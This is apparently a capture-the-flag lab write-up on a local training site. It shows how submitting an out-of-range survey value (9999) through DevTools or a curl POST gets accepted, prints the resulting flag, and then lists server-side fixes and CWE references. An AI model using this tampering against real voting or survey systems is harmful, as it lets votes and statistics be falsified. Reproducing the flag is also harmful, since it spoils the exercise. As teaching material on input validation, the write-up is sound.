# 05. Parameter Tampering in Survey (out‑of‑range `valeur`)

**One‑liner:** The survey trusts the dropdown value `valeur` coming from the client. By submitting a value outside `1..10`, the backend accepts it and returns a flag.

---

## Where

* **URL:** `http://127.0.0.1:8080/?page=survey`
* **Params:**

  * `sujet` (POST, hidden) — subject ID (e.g., `2`, `3`)
  * `valeur` (POST, select) — supposed to be **1..10**
* **Auth:** none

---

## How to reproduce

**DevTools method**

1. Open the page and inspect the `<select name="valeur">`.
2. Add or edit an option, e.g. `<option value="9999" selected>9999</option>`.
3. Let the form auto‑submit (onchange) or submit manually.

**cURL (deterministic)**

```bash
curl -i -X POST 'http://127.0.0.1:8080/?page=survey' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'sujet=2&valeur=9999'
```

**Observed:** the application accepts the out‑of‑range value and returns the flag

```
03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa
```
---

## Impact

* **Data integrity:** Averages and vote counts can be manipulated arbitrarily.
* **Trust erosion / abuse:** Enables ballot‑stuffing, possible DoS of stats (very large numbers).

**Severity:** High (no auth, trivial to exploit, integrity impact in real apps).

---

## Fix (server‑side — mandatory)

1. **Validate on the server:** `valeur` must be an integer in **[1..10]**. Reject anything else (HTTP 400) and **do not count** the vote.
2. **Whitelist‑based handling:** Map known `sujet` IDs to existing subjects on the server; reject unknown IDs.
3. **Business rules:** Enforce one vote per user/session/account; rate‑limit submissions.
4. **Defensive coding:** Treat `valeur` as untrusted; if stored/used in SQL, use prepared statements and type binding.

---

## Client‑side hygiene (nice to have)

* Keep the dropdown, but remember it’s for UX only. Never rely on it for security.

---

## References

* OWASP Cheat Sheet: **Input Validation**, **Parameter Tampering**
* CWE‑20: **Improper Input Validation**
* CWE‑472: **External Control of Assumed‑Immutable Web Parameter**
* (context) CWE‑602: **Client‑Side Enforcement of Server‑Side Security**
